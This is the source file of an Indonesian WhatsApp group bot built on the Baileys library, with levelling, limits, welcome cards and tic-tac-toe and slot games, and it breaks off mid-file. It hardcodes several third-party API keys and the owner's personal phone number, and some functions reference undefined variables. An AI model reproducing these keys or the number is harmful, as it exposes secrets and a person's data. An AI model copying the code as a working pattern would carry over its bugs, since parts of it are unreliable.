//KAGA ADA YANG LANGKA :V

const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WAMessageProto,
   WALocationMessage,
   ChatModification,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   processTicksAndRejections,
   ECONNABORTED,
   apikey,
   WA_DEAFULT_EPHEMERAL,
   DataView,
   TypedArray,
   device,
   Browser
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone") 
const fs = require("fs") 
const crypto = require('crypto')
const FormData = require('form-data')
const imageToBase64 = require('image-to-base64')
const axios = require('axios')
const yts = require( 'yt-search')
const hx = require('hxz-api')
const ms = require('parse-ms')
const qrcode = require("qrcode-terminal") 
const { color, bgcolor } = require('./aldiganz/color')
const { animesaran } = require('./aldiganz/animesaran')
const { animesaran2 } = require('./aldiganz/animesaran2')
const { help } = require('./aldiganz/help')
const { rules } = require('./aldiganz/rules')
const { sewabot } = require('./aldiganz/sewabot')
const { donasi } = require('./aldiganz/donasi')
const { fetchJson } = require('./aldiganz/fetcher')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const { recognize } = require('./aldiganz/ocr')
const { exec } = require("child_process")
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./aldiganz/functions')
const tiktod = require('tiktok-scraper')
const image = require('image-to-base64')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const tik = require('tiktok-scraper-without-watermark')
const { tiktokDown } = require('./lib/tiktok')
const { fbDown } = require('./lib/fb')
const { y2mateA, y2mateV } = require('./lib/y2mate.js')
const imgbb = require('imgbb-uploader')  
const { removeBackgroundFromImageFile } = require('remove.bg')
const { antiSpam } = require('./lib/antispam')
const { convertSticker } = require('./lib/swm.js')
const { BackgroundFromImageFile } = require('remove.bg')
const { ind } = require('./akira')
const tictactoe = JSON.parse(fs.readFileSync("./lib/tictactoe.json"))
const setTtt = require('./lib/tictactoe.js')
const { fotoIg, videoIg } = require('./lib/instagram')
const { yta, ytv, igdl, upload, uploadImages } = require('./lib/ytdl')


//apikey
const apivhtear = '4d5c64fc8bc04951af06abf69bffad2a' // 1bulan
const ZeksApi = 'aldiFvnky28'
LeysKey = 'RJJKCXSU'
const Api ='hardianto'
const Free ='aldibot'
const Gw = 'LindowApi'
const Beni = 'benniismael'
const TobzKey = 'Tobzzz17'
const lolhuman = 'b41ff4678e98e67898616796' // Unlimited
const xteam = '131e5a5728d652af' //1bulan
const namabot = 'ALPHABOT'
const namaowner = 'Farhan'
const thumb = fs.readFileSync('./lib/odc.jpeg')
const thumb2 =fs.readFileSync('./lib/odc.jpeg')
const ct = '```'
baterai = {
    baterai: 0,
    cas: false
}
//kontak
const vcard = 'BEGIN:VCARD\n'  //Jangan diganti,Ntar error
            + 'VERSION:3.0\n'  //Jangan diganti,Ntar error
            + 'FN: Farhan\n'  // Ganti jadi namamu
            + 'ORG:ALPHABOT;\n'  // Ganti jadi namamu/Botmu
            + 'TEL;type=CELL;type=VOICE;waid=6282351465415:+6282351465415\n'  // Ganti jadi nomormu, tapi jangan ubah polanya
            + 'END:VCARD' // Jangan diganti,Ntar Error
                        
                     
//settings    
prefix = '#'
blocked = []  
winawal = 1 // Win Tictactoe ( MyMans APIs )
loseawal = 1 // Lose Tictactoe ( MyMans APIs )
memberwin = 1 // Win ( MyMans APIs )
memberlose = 1 // Lose ( MyMans APIs )
const X = "❌" // Tictactoe ( MyMans APIs & Lolhuman )
const O = "⭕️" // Tictactoe ( MyMans APIs & Lolhuman )
const tunjuk = "👈" // Tictactoe ( MyMans APIs & Lolhuman )
bugc = true // Antibug Gc ( MyMans APIs & MhankBarBar )
limitawal = '500' //Terserah Mo Ganti apa kgk
memberlimit = 1 //Terserah Mo Ganti apa kgk
cr = 'ALPHABOT' //UBAH AJH 
vr = 'XONE CH \nSubscribe My Channel ' //GAUSH DI UBAH ASW

//owner number
const ownerNumber = ["6282351465415@s.whatsapp.net"]  //Ganti Jadi Nomormu

//file json
const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _win = JSON.parse(fs.readFileSync('./lib/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./lib/tttlose.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/bot/nsfw.json'))
const pepolu = JSON.parse(fs.readFileSync('./database/user/totalcmd.json'))[0].totalcmd
const ban = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const samih = JSON.parse(fs.readFileSync('./database/bot/simi.json'))
const afk = JSON.parse(fs.readFileSync('./database/user/afk.json'))
 prem = JSON.parse(fs.readFileSync('./database/user/prem.json'))
 premium = JSON.parse(fs.readFileSync('./database/user/premium.json'))
const isBanned = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'))
const bad = JSON.parse(fs.readFileSync('./database/group/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/group/badword.json'))
const antifirtex = JSON.parse(fs.readFileSync('./database/group/antifirtex.json'))
const balance = JSON.parse(fs.readFileSync('./database/bot/balance.json'))
const antifirtex2 = JSON.parse(fs.readFileSync('./database/group/antifirtex2.json'))
const antifirtex3 = JSON.parse(fs.readFileSync('./database/group/antifirtex3.json'))
const antifirtex4 = JSON.parse(fs.readFileSync('./database/group/antifirtex4.json'))
const antifirtex5 = JSON.parse(fs.readFileSync('./database/group/antifirtex3.json'))
const antifirtex6 = JSON.parse(fs.readFileSync('./database/group/antifirtex4.json'))





//]=====> game <=====[
const getWins = (sender, total) => {
            let position = false
            Object.keys(_win).forEach((i) => {
                if (_win[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _win[position].win -= total
                 fs.writeFileSync('./lib/tttwin.json', JSON.stringify(_win))
            }
        }
 
const getLose = (sender, total) => {
            let position = false
            Object.keys(_lose).forEach((i) => {
                if (_lose[i].jid === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _lose[position].lose -= total
                 fs.writeFileSync('./lib/tttlose.json', JSON.stringify(_lose))
            }
        }
    
//function

const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }
        const jadiUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
        }
const bikinSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
        }
        
        const getLimit = (sender) => {
        	let position = false
              Object.keys(limit).forEach ((i) => {
              	if (limit[position].id === sender) {
              	   position = i
                  }
              })
             if (position !== false) {
                return limit[position].limit
            }
        }
             
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() *  _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
            const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
     

            const getPremiumExpired = (sender) => {
		    let position = null
		    Object.keys(prem).forEach((i) => {
		        if (prem[i].id === sender) {
		            position = i
		        }
		    })
		    if (position !== null) {
		        return prem[position].expired
		    }
		} 
		
		const expiredCheck = () => {
		    setInterval(() => {
		        let position = null
		        Object.keys(prem).forEach((i) => {
		            if (Date.now() >= prem[i].expired) {
		                position = i
		            }
		        })
		        if (position !== null) {
		            console.log(`Premium expired: ${prem[position].id}`)
		            prem.splice(position, 1)
		            fs.writeFileSync('./database/user/premium.json', JSON.stringify(prem))
		             }
		    }, 1000)
		} 
		
		const getAllPremiumUser = () => {
		    const array = []
		    Object.keys(prem).forEach((i) => {
		        array.push(prem[i].id)
		    })
		    return array
		}
		
        
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);


  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
//Bagian Function Ngab Kalo Ada yang Di Ubah 100℅ EROR
const aldi = new WAConnection()
   aldi.on('qr', qr => {
   qrcode.generate(qr, { small: true })
   console.log(color('[','aqua'),color('aldi','white'),color(']','aqua'),color('SQAN QR CODE DI WHATSAPP WEB!!','aqua'),color('You','white'),color('Tube','red'),color('XennBotz','yellow'))
}) 
const CFonts  = require('cfonts')
CFonts.say('ITSME ALDI', {
  font: 'chrome',
  align: 'center',
  gradient: ['red', 'magenta']
})
CFonts.say(`BY ALDI`, {
  font: 'console',
  align: 'center',
  gradient: ['red', 'magenta']
})
aldi.on('credentials-updated', () => {
	const authInfo = aldi.base64EncodedAuthInfo()
   console.log(`credentials updated!`)
   fs.writeFileSync('./aldibot.json', JSON.stringify(authInfo, null, '\t'))
})
fs.existsSync('./aldibot.json') && aldi.loadAuthInfo('./aldibot.json')
aldi.connect();

aldi.on('CB:action,,battery', json => {
	const a = json[2][0][1].value
	const b = json[2][0][1].live
	baterai.baterai = a
	baterai.cas = b
})  
aldi.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
			try {
mem = anu.participants[0]
			console.log(anu)
            try {
            pp_user = await aldi.getProfilePicture(mem)
            } catch (e) {
            pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            try {
            pp_grup = await aldi.getProfilePicture(anu.jid)
            } catch (e) {
            pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
           if (anu.action == 'demote') {
            mdata = await aldi.groupMetadata(anu.jid)
            member = mdata.participants.length
        	num = anu.participants[0]
            anu_user = aldi.contacts[mem]
            teks = `Selamat Untuk @${num.split('@')[0]}\nAnda Telah Turun Pangkat, Tadinya Admin Sekarang Member`
	        bbuufff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/demote?nama=${encodeURI(anu_user.notify)}&member=${member}&pesan=${encodeURI(anu_user.notify)} Turun Pangkat&pp=${pp_user}&bg=${pp_grup}`)
	        
		aldi.sendMessage(mdata.id, bbuufff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
		}
		if (anu.action == 'promote') {
            mdata = await aldi.groupMetadata(anu.jid)
            member = mdata.participants.length
        	num = anu.participants[0]
            anu_user = aldi.contacts[mem]
            teks = `Selamat Kepada @${num.split('@')[0]}\nAnda Telah Naik Pangkat, Dari Member Menjadi Admin`
	        bbuuufff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/promote?nama=${encodeURIComponent(anu_user.notify)}&member=${member}&pesan=${encodeURIComponent(anu_user.notify)} Naik Pangkat&pp=${pp_user}&bg=${pp_grup}`)
	
		aldi.sendMessage(mdata.id, bbuuufff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
		}
       if (anu.action == 'add') {
            mdata = await aldi.groupMetadata(anu.jid)
            member = mdata.participants.length
        	num = anu.participants[0]
            anu_user = aldi.contacts[mem]
            teks = `        
Hi 👋  @${num.split('@')[0]} 
┌────────────────▢
│
│「 *_ɪɴᴛʀᴏ_* 」
├❉ *Intro atow ngga kick?*
├❉️ *ɴᴀᴍᴀ* :
├❉ *ᴜᴍᴜʀ* :
├❉ *Udah ///Punya Doi/Blm* :
├❉ *ʜᴏʙʙʏ* :
├❉ *Gender* :
├❉ *ᴀꜱᴀʟ ᴋᴏᴛᴀ* :
│
└────────────────▢`
/* Welcome in ${mdata.subject}

*Deskripsi grup*\n\n\n${mdata.desc}`*/
	        bbbuuufff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome2?nama=${encodeURIComponent(anu_user.notify)}&descriminator=${member}&memcount=${member}&gcname=${encodeURIComponent(mdata.subject)}&gcicon=${pp_grup}&pp=${pp_user}&bg=${pp_grup}`) 
            
		aldi.sendMessage(mdata.id, bbbuuufff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
		}
            if (anu.action == 'remove') {
                mdata = await aldi.groupMetadata(anu.jid)
            	num = anu.participants[0]
                anu_user = aldi.contacts[mem]
                member = mdata.participants.length
                out = `\`\`\`Selamat Tinggal @${num.split('@')[0]} Kalo Balik Lagi Bawa Nasi Goreng\`\`\``
                bbbbuuuuffff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye2?nama=${encodeURIComponent(anu_user.notify)}&descriminator=${member}&memcount=${member}&gcname=${encodeURIComponent(mdata.subject)}&gcicon=${pp_grup}&pp=${pp_user}&bg=${pp_grup}`)
                aldi.sendMessage(mdata.id, bbbbuuuuffff, MessageType.image, {caption: out, contextInfo: {"mentionedJid": [num]}})
               }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
       }
})
	aldi.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

	aldi.on('message-new', async (mek) => {
		try {
			if (!mek.message) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'listResponseMessage') && mek.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : ''
            budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'listResponseMessage') && mek.message.listResponseMessage.singleSelectReply.selectedRowId ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : ''
            var tas = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		    const args = body.trim().split(/ +/).slice(1)    
			const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		    var Link = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const mesejAnti = Link.slice(0).trim().split(/ +/).shift().toLowerCase()
		    const isCmd = body.startsWith(prefix)
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const q = args.join('  ')
			const botNumber = aldi.user.jid
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const senderNumber = sender.split("@")[0]
		   const pushname = aldi.contacts[sender] != undefined ? aldi.contacts[sender].vname || aldi.contacts[sender].name || aldi.contacts[sender].notify : ''
			const groupMetadata = isGroup ? await aldi.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
            const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const fkatalok =  {key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2005, status: 200, thumbnail: thumb2, surface: 200, message: `ALPHABOT  \nㅤㅤㅤㅤ`, orderTitle: 'ㅤㅤㅤㅤ', sellerJid: '0@s.whatsapp.net'} } } 



const hasilburuan = [
  '🐇 kelinci',
  '🦖 Tirex',
  '🦏 Badak',
  '🐒 Monyet',
  '🐅 Harimau',
  '🐆 Macan Tutul',
  '🐎 Kuda',
  '🐘 Gajah',
  '🦇 Kelelawar',
  '🕊 Merpati',
  '🐊 Buaya',
  '🐉 Naga',
  '🦕 Sauropod'
  ]
//auto read//
aldi.chatRead(from, "read")
                             /////game
                         
// ini slott
const slotnohoki = [
		'🐡 : 🐬 : 🐋',
		'🐓 : 🐬 : 🦉',
    '🐿 : 🦔 : 🐲',
    '🐭 : 🐱 : 🐿',
    '🐡 : 🐭 : 🐋',
    '🐭 : ?? : 🐶',
    '?? : 🐬 : 🦥',
    '?? : 🐠 : 🦄',
    '?? : 🐬 : 🐠',
    '🦋 : 🐜 : 🐋',
    '🐡 : 🐞 : 🐌',
    '🐜 : 🐞 : 🐌',
    '🐘 : 🐬 : ??',
    '🐡 : 🐃 : 🐋',
    '🐡 : 🐬 : 🦏',
    '🦏 : 🐘 : 🐃',
    '🐜 : 🦂 : 🦏'
  ]
  // function for get the winner
const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return aldi.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./lib/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return aldi.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./lib/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
        return aldi.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `\n\n•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `\n_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻\n\n`
                    teks += board
                    teks += `\n\n•> Win : @${player2} 🎉\n_fix tictactoe by mans 2021_`
                    return aldi.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉\n\n`
                    teks += board
                    teks += `\n\n•> Lose : @${player2} 👻\n_fix tictactoe by mans 2021_`
                    return aldi.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
                teks += `•> Draw : @${player1} 🦁\n\n`
                teks += board
                teks += `\n\n•> Draw : @${player2} 🐯\n_fix tictactoe by 𝙍 𝙚 𝙨 𝙩 𝙖 𝙁 𝙫 𝙣 𝙠 𝙮 2021_`
                return aldi.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return aldi.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}\n`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `\n\n•> Player 2 : @${lawan.split("@")[0]} (${pelawan})\n_fix tictactoe by mans 2021_`
                return aldi.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./lib/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		aldi.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}
       
const slott = [
		'🐡 : 🐬 : 🐋 YOU LOSE',
		'🐋 : 🐋 : 🐋 YOU WIN',
		'🐓 : 🐬 : 🦉 YOU LOSE',
		'🐓 : 🐓 : 🐓 YOU WIN',
    '🐿 : 🦔 : 🐲 YOU LOSE',
    '🐡 : 🐡 : 🐡 YOU WIN',
    '🐭 : 🐱 : 🐿 YOU LOSE',
